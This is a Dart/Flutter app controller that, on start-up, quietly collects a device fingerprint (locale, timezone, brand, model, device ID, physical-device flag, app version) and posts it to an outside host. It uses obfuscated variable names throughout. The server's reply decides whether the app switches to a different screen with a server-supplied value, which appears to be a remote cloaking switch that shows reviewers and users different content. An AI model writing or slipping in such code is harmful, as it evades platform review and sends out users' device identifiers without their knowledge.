import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void checkConnect() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/noNetwork");
  }
}

class PageLogic extends GetxController {

  var tmrjoe = RxBool(false);
  var zihmuwl = RxBool(true);
  var pdegkroy = RxString("");
  var terrence = RxBool(false);
  var oberbrunner = RxBool(true);
  final axlekwqpdj = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    checkConnect();
    opbdve();
  }


  Future<void> opbdve() async {

    terrence.value = true;
    oberbrunner.value = true;
    zihmuwl.value = false;

    axlekwqpdj.post("https://get.neasla.live/kydiguplxnwjqetrbshzcfmvoa",data: await mobizgfvyd()).then((value) {
      var agjcu = value.data["agjcu"] as String;
      var tsvdmblp = value.data["tsvdmblp"] as bool;
      if (tsvdmblp) {
        pdegkroy.value = agjcu;
        erwin();
      } else {
        yundt();
      }
    }).catchError((e) {
      zihmuwl.value = true;
      oberbrunner.value = true;
      terrence.value = false;
    });
  }

  Future<Map<String, dynamic>> mobizgfvyd() async {
    final DeviceInfoPlugin slbpav = DeviceInfoPlugin();
    PackageInfo inwt_nhqripk = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var viqmdas = Platform.localeName;
    var sdzrcgu = currentTimeZone;

    var scej = inwt_nhqripk.packageName;
    var weisx = inwt_nhqripk.version;
    var fpktgmji = inwt_nhqripk.buildNumber;

    var usfrc = inwt_nhqripk.appName;
    var mqsx = "";
    var jdqawm  = "";
    var jqhcld = "";
    var reedBayer = "";
    var cathyThiel = "";
    var aliyaGrant = "";
    var ephraimLesch = "";
    var wileyDonnelly = "";
    var larueKassulke = "";
    var ilaFriesen = "";
    var christKohler = "";


    var eshi = "";
    var ogih = false;

    if (GetPlatform.isAndroid) {
      eshi = "android";
      var eyvwndg = await slbpav.androidInfo;

      jqhcld = eyvwndg.brand;

      mqsx  = eyvwndg.model;
      jdqawm = eyvwndg.id;

      ogih = eyvwndg.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      eshi = "ios";
      var ftbajvpw = await slbpav.iosInfo;
      jqhcld = ftbajvpw.name;
      mqsx = ftbajvpw.model;

      jdqawm = ftbajvpw.identifierForVendor ?? "";
      ogih  = ftbajvpw.isPhysicalDevice;
    }
    var res = {
      "usfrc": usfrc,
      "weisx": weisx,
      "scej": scej,
      "reedBayer" : reedBayer,
      "mqsx": mqsx,
      "jqhcld": jqhcld,
      "larueKassulke" : larueKassulke,
      "viqmdas": viqmdas,
      "eshi": eshi,
      "ogih": ogih,
      "cathyThiel" : cathyThiel,
      "aliyaGrant" : aliyaGrant,
      "ilaFriesen" : ilaFriesen,
      "jdqawm": jdqawm,
      "ephraimLesch" : ephraimLesch,
      "fpktgmji": fpktgmji,
      "sdzrcgu": sdzrcgu,
      "wileyDonnelly" : wileyDonnelly,
      "christKohler" : christKohler,

    };
    return res;
  }

  Future<void> yundt() async {
    Get.offAllNamed("/capsuleTab");
  }

  Future<void> erwin() async {
    Get.offAllNamed("/capsuleFin");
  }

}
